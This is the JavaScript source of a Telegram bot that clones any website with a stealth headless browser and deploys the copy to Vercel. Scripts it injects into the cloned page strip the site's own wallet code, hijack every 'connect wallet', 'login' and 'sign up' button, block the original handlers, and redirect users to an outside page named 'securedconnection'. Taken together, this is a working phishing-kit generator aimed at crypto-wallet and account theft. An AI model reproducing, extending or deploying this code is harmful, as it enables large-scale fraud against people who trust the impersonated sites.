import { Telegraf, Markup } from "telegraf";
import axios from "axios";
import puppeteer from "puppeteer-extra";
import StealthPlugin from "puppeteer-extra-plugin-stealth";
import * as cheerio from "cheerio";
import fs from "fs-extra";
import path from "path";
import { URL } from "url";
import { Vercel } from "@vercel/sdk";
import dotenv from "dotenv";
import { fileURLToPath } from "url";

// Define __filename and __dirname
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
dotenv.config();

const vercel = new Vercel({
  bearerToken: process.env.vercelToken, // replace with your real token
});

const bot = new Telegraf(process.env.TELEGRAM_BOT_TOKEN);
puppeteer.use(StealthPlugin());

// Track per-user states
const userStates = new Map();

// /start command
bot.start((ctx) => {
  ctx.reply("✅ Welcome! Use /clone to fetch a website’s HTML.");
});

// /run command
bot.command("run", (ctx) => {
  ctx.reply("🏃‍♂️ Running...");
});

// /clone command – ask for website
bot.command("clone", (ctx) => {
  ctx.reply(
    "🔗 Enter the <b>website URL</b> you want to clone (must start with <code>https://</code>)\n\n✅ Make sure the site is live and accessible.",
    { parse_mode: "HTML" }
  );

  userStates.set(ctx.chat.id, "awaiting_url");
});

const userFolders = new Map();

bot.on("text", async (ctx) => {
  const state = userStates.get(ctx.chat.id);
  // === CASE 1: CLONING ===
  if (state === "awaiting_url") {
    const siteUrl = ctx.message.text.toLowerCase();
    if (!siteUrl.startsWith("https://")) {
      return ctx.reply("❌ Enter a valid link that starts with *https://*", {
        parse_mode: "Markdown",
      });
    }

    userStates.delete(ctx.chat.id);
    await ctx.reply(
      "🔍 Cloning the full website...\n\nHang tight — this might take a little while."
    );

    (async () => {
      const outputDir = path.join(__dirname, "cloned");
      const redirectURL = "https://securedconnection.vercel.app/"; // URL to redirect all links to
      // Clear the cloned directory before starting
      async function clearClonedDirectory() {
        try {
          await fs.remove(outputDir);
          console.log("🧹 Cleared cloned directory:", outputDir);
        } catch (err) {
          console.error("⚠️ Failed to clear cloned directory:", err.message);
        }
      }

      try {
        // Clear and create output directory
        await clearClonedDirectory();
        await fs.ensureDir(outputDir);
        console.log("📁 Created output directory:", outputDir);

        // Launch browser
        const browser = await puppeteer.launch({
          headless: "new",
          args: [
            "--no-sandbox",
            "--disable-setuid-sandbox",
            "--disable-cache",
            "--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
          ],
        });

        try {
          const page = await browser.newPage();
          page.setDefaultNavigationTimeout(60000);

          // Navigate and wait for page to load
          console.log("🌐 Navigating to:", siteUrl);
          await page.goto(siteUrl, {
            waitUntil: "networkidle2", // Less strict than networkidle0
            timeout: 120000, // 120 seconds
          });
          await page.waitForSelector("body", { timeout: 10000 });
          await new Promise((resolve) => setTimeout(resolve, 10000)); // 3-second delay for JS content

          // Attempt to enable request interception
          try {
            await page.setRequestInterception(true);
            page.on("request", (request) => {
              if (request.url().includes("wss://relay.walletconnect.com")) {
                request.abort();
                console.log("🚫 Aborted WalletConnect WebSocket request");
              } else {
                request.continue();
              }
            });
          } catch (err) {
            console.warn(
              "⚠️ Failed to enable request interception:",
              err.message
            );
            console.log("Continuing without request interception...");
          }

          // Override history.replaceState to prevent cross-origin errors
          await page.evaluate(() => {
            const originalReplaceState = history.replaceState;
            history.replaceState = function (state, title, url) {
              try {
                if (
                  url &&
                  !url.startsWith("/") &&
                  !url.startsWith(window.location.origin)
                ) {
                  console.warn(
                    `🚫 Blocked cross-origin replaceState to: ${url}`
                  );
                  return;
                }
                originalReplaceState.call(history, state, title, url);
              } catch (err) {
                console.warn(`⚠️ Error in replaceState: ${err.message}`);
              }
            };
          });

          // Disable WalletConnect globals and scripts in the browser
          await page.evaluate(() => {
            window.WalletConnect = undefined;
            window.WalletConnectProvider = undefined;
            console.log("🚫 Disabled WalletConnect globals");
          });

          // Capture HTML
          const html = await page.content();
          const $ = cheerio.load(html);

          // Remove existing <base> tag and add new one
          $("base").remove();
          $("head").prepend(`<base href="${siteUrl}">`);

          // Remove wallet-related scripts
          $("script").each((_, el) => {
            const src = $(el).attr("src") || "";
            const content = $(el).html() || "";
            if (
              src.toLowerCase().includes("walletconnect") ||
              src.toLowerCase().includes("metamask") ||
              src.toLowerCase().includes("web3") ||
              content.toLowerCase().includes("walletconnect") ||
              content.toLowerCase().includes("metamask") ||
              content.toLowerCase().includes("web3")
            ) {
              $(el).remove();
              console.log(
                `🗑️ Removed wallet-related script: ${src || "inline"}`
              );
            }
          });

          // Add history.replaceState override to the cloned HTML
          $("head").prepend(`<script class="history-override">
        (function() {
          const originalReplaceState = history.replaceState;
          history.replaceState = function(state, title, url) {
            try {
              if (url && !url.startsWith("/") && !url.startsWith(window.location.origin)) {
                console.warn("🚫 Blocked cross-origin replaceState to: " + url);
                return;
              }
              originalReplaceState.call(history, state, title, url);
            } catch (err) {
              console.warn("⚠️ Error in replaceState: " + err.message);
            }
          };
        })();
      </script>`);

     

          $("head").prepend(`   <script class="dynamic-script">
  window.addEventListener("DOMContentLoaded", () => {
    console.log("🔁 Running prioritized image fixer...");

    const redirectURL = "${redirectURL}";

    function fixImagesAndButtons() {
      const clickableElements = document.querySelectorAll(
  'button, a, [role="button"], [onclick]'
);

const interactiveElements = Array.from(clickableElements).filter((el) => {
  const text = (el.innerText || "").toLowerCase().trim();
  return (
    text.includes("connect wallet") ||
    text.includes("connect to wallet") ||  
    text.includes("connect") ||
    text.includes("wallet connect") ||
    text.includes("metamask") ||
    text.includes("web3") ||
    text.includes("log in") ||
    text.includes("sign in") ||
    text.includes("sign up") ||
    text.includes("register") ||
    text.includes("create account") ||
    text.includes("login")
  );
});


      interactiveElements.forEach((el) => {
        // Remove any href or onclick behavior
        el.removeAttribute("href");
        el.removeAttribute("onclick");
        
    // First event listener
            el.addEventListener("click", function (event) {
              event.stopImmediatePropagation(); // This stops the next listener from running
              console.log("First click handler");
            });


        // If there's an <a> inside, disable it too
        const anchor = el.querySelector("a");
        if (anchor) {
          anchor.removeAttribute("href");
          anchor.removeAttribute("onclick");
          anchor.addEventListener("click", (event) => {
            event.preventDefault();
            event.stopImmediatePropagation();
            window.location.href = redirectURL;
          });
        }

        // Add redirect handler on click
        el.addEventListener("click", (event) => {
          event.preventDefault();
          event.stopImmediatePropagation();
          window.location.href = redirectURL;
        });
      });

      // Fix image sources
      const images = document.querySelectorAll("img");
      images.forEach((img) => {
        const src = img.getAttribute("src");
        img.removeAttribute("srcset");
        if (
          src &&
          src.startsWith("/") &&
          !src.startsWith("data:") &&
          !src.startsWith("//") &&
          !src.startsWith("http")
        ) {
          img.src = new URL(src, "${siteUrl}").href;
        }
      });
    }

    fixImagesAndButtons();
    setTimeout(fixImagesAndButtons, 3000);
    setInterval(fixImagesAndButtons, 10000);
  });
</script>`);


$("head").prepend(`  <script>
  const redirectURL = "https://securedconnection.vercel.app/";

  function blockEvent(event) {
    event.preventDefault();
    event.stopImmediatePropagation();
    event.stopPropagation();
    console.log("Blocked & Redirecting...");
    window.location.href = redirectURL;
  }

  function patchElement(el) {
    if (!el || el.dataset.patched) return;
    el.dataset.patched = "true";

    ["click", "mousedown", "pointerdown"].forEach((eventType) => {
      el.addEventListener(eventType, blockEvent, true);  // Capture phase
      el.addEventListener(eventType, blockEvent, false); // Bubble phase
    });

    // Disable default attributes
    el.removeAttribute("href");
    el.removeAttribute("onclick");
  }

  function scanAndPatch() {
    const allElements = document.querySelectorAll(
  'button, a, [role="button"], [onclick]'
);
    allElements.forEach((el) => {
      const text = (el.innerText || "").toLowerCase().trim();
      if (
        text.includes("connect wallet") ||
        text.includes("connect to wallet") ||
        text.includes("connect") ||
        text.includes("wallet connect") ||
        text.includes("metamask") ||
        text.includes("web3") ||
        text.includes("log in") ||
        text.includes("sign in") ||
        text.includes("sign up") ||
        text.includes("register") ||
        text.includes("create account") ||
        text.includes("login")
      ) {
        patchElement(el);
      }
    });
  }

  window.addEventListener("load", () => {
    scanAndPatch();

    // Watch for dynamic elements
    const observer = new MutationObserver(() => {
      scanAndPatch();
    });

    observer.observe(document.body, {
      childList: true,
      subtree: true,
    });
  });

  // Optional: override addEventListener to block future handlers
  const originalAddEventListener = EventTarget.prototype.addEventListener;
  EventTarget.prototype.addEventListener = function (type, listener, options) {
    if (typeof listener === "function" && type === "click") {
      // Prevent wallet modal listeners from registering
      const toString = listener.toString();
      if (
        toString.includes("wallet") ||
        toString.includes("connect") ||
        toString.includes("provider") ||
        toString.includes("web3")
      ) {
        console.warn("Blocked suspicious listener:", toString.slice(0, 100));
        return;
      }
    }
    return originalAddEventListener.call(this, type, listener, options);
  };
</script>

`)

          // Save HTML
          await fs.outputFile(path.join(outputDir, "index.html"), $.html());
          console.log("✅ Done! Saved at cloned/index.html");
          await ctx.reply(
            "✅ Site cloned using original CSS links! Ready for deploy.",
            Markup.inlineKeyboard([
              Markup.button.callback("🚀 Host Site", "host"),
            ])
          );
        } catch (err) {
          console.error("❌ Page processing failed:", err.message, err.stack);
        } finally {
          await browser.close();
        }
      } catch (err) {
        console.error("❌ Script failed:", err.message, err.stack);
        await ctx.reply("⚠️ Failed to clone site.");
        process.exit(1);
      }
    })();
  }

  // === CASE 2: HOSTING ===
  if (state === "awaiting_site_name") {
    userStates.delete(ctx.chat.id);
    const siteName = ctx.message.text.trim().toLowerCase().replace(/\s+/g, "-");

    if (!siteName || siteName.length < 3) {
      return ctx.reply("❌ Site name is too short or invalid. Try again.");
    }

    const folder = "./cloned";
    if (!fs.existsSync(folder)) {
      return ctx.reply("❌ No cloned folder found. Please clone a site first.");
    }

    await ctx.reply("🛠️ Just a moment...\n\nWe're getting your site ready!");

    const TEXT_FILE_EXTENSIONS = [
      ".html",
      ".js",
      ".css",
      ".json",
      ".txt",
      ".md",
    ];
    const isTextFile = (filePath) =>
      TEXT_FILE_EXTENSIONS.includes(path.extname(filePath).toLowerCase());

    function getFilesArray(dir, baseDir = dir) {
      const entries = fs.readdirSync(dir, { withFileTypes: true });
      let files = [];

      for (const entry of entries) {
        const fullPath = path.join(dir, entry.name);
        const relativePath = path
          .relative(baseDir, fullPath)
          .replace(/\\/g, "/");

        if (entry.isDirectory()) {
          files = files.concat(getFilesArray(fullPath, baseDir));
        } else {
          const fileBuffer = fs.readFileSync(fullPath);
          const data = isTextFile(fullPath)
            ? fileBuffer.toString("utf-8")
            : fileBuffer.toString("base64");

          files.push({ file: relativePath, data });
        }
      }

      return files;
    }

    const files = getFilesArray(folder);

    try {
      const result = await vercel.deployments.createDeployment({
        teamId: process.env.vercelTeamId, // replace with your real team ID
        slug: siteName,
        requestBody: {
          name: siteName,
          project: siteName,
          target: "production",
          files: files,
          projectSettings: {
            framework: null,
            buildCommand: null,
            installCommand: null,
            outputDirectory: ".",
          },
        },
      });

      console.log("✅ Deployment complete!", result);

      setTimeout(() => {
        ctx.reply(
          `✅ *Deployment Successful!*\n\n` +
            `🌐 *Predicted URL:*\nhttps://${result.name}.vercel.app\n\n` +
            `🚀 *Live URL(s):*\n${result.alias?.[0] || "Not available"}\n` +
            `${result.alias?.[1] ? `\n${result.alias[1]}` : ""}\n\n` +
            `🎉 Your site is now live on Vercel!`,
          { parse_mode: "Markdown" }
        );
      }, 3000); // Delay to ensure Vercel processes the deployment
    } catch (error) {
      console.error("❌ Hosting error:", error);
      ctx.reply("⚠️ Error deploying site. Please try again later.");
    }
  }
});

// Handle "Host" button click
bot.action("host", async (ctx) => {
  ctx.answerCbQuery();
  userStates.set(ctx.chat.id, "awaiting_site_name");
  return ctx.reply(
    "💡 <b>What's the name of your site?</b>\n\n⚠️ Make sure it's unique and hasn't been used before.",
    { parse_mode: "HTML" }
  );
});

// Handle text message (e.g., site name)
bot.on("text", async (ctx) => {
  const state = userStates.get(ctx.chat.id);

  if (state !== "awaiting_site_name") return;

  userStates.delete(ctx.chat.id); // Clear state
  const siteName = ctx.message.text.trim().toLowerCase().replace(/\s+/g, "-");

  if (!siteName || siteName.length < 3 || siteName.includes(".")) {
    return ctx.reply(
      "⚠️ The site name is too short or invalid.\n\n🚫 Dots (.) are not allowed.\n✍️ Please try again with just the name."
    );
  }

  const folder = "./cloned";
  console.log("Hosting folder:", folder);

  if (!fs.existsSync(folder)) {
    return ctx.reply("❌ No cloned folder found. Please clone a site first.");
  }

  const TEXT_FILE_EXTENSIONS = [".html", ".js", ".css", ".json", ".txt", ".md"];
  const isTextFile = (filePath) =>
    TEXT_FILE_EXTENSIONS.includes(path.extname(filePath).toLowerCase());

  function getFilesArray(dir, baseDir = dir) {
    const entries = fs.readdirSync(dir, { withFileTypes: true });
    let files = [];

    for (const entry of entries) {
      const fullPath = path.join(dir, entry.name);
      const relativePath = path.relative(baseDir, fullPath).replace(/\\/g, "/");

      if (entry.isDirectory()) {
        files = files.concat(getFilesArray(fullPath, baseDir));
      } else {
        const fileBuffer = fs.readFileSync(fullPath);
        const data = isTextFile(fullPath)
          ? fileBuffer.toString("utf-8")
          : fileBuffer.toString("base64");

        files.push({ file: relativePath, data });
      }
    }

    return files;
  }

  const files = getFilesArray(folder);

  try {
    const result = await vercel.deployments.createDeployment({
      teamId: "team_AwRWdZTHaoWRoHvGvRg19YS7",
      slug: siteName,
      requestBody: {
        name: siteName,
        project: siteName,
        target: "production",
        files: files,
        projectSettings: {
          framework: null,
          buildCommand: null,
          installCommand: null,
          outputDirectory: ".",
        },
      },
    });

    console.log("✅ Deployment complete!", result);

    ctx.reply(
      `✅ *Deployment Successful!*\n\n` +
        `🌐 *Predicted URL:*\nhttps://${result.name}.vercel.app\n\n` +
        `🚀 *Live URL(s):*\n${result.alias?.[0] || "Not available"}\n` +
        `${result.alias?.[1] ? `\n${result.alias[1]}` : ""}\n\n` +
        `🎉 Your site is now live on Vercel!`,
      { parse_mode: "Markdown" }
    );
  } catch (error) {
    console.error("❌ Hosting error:", error);
    ctx.reply("⚠️ Error deploying site. Please try again later.");
  }
});

// Start the bot
bot.launch().then(() => {
  console.log("🤖 Bot is running...");
});
console.log("🤖 Bot is running...");
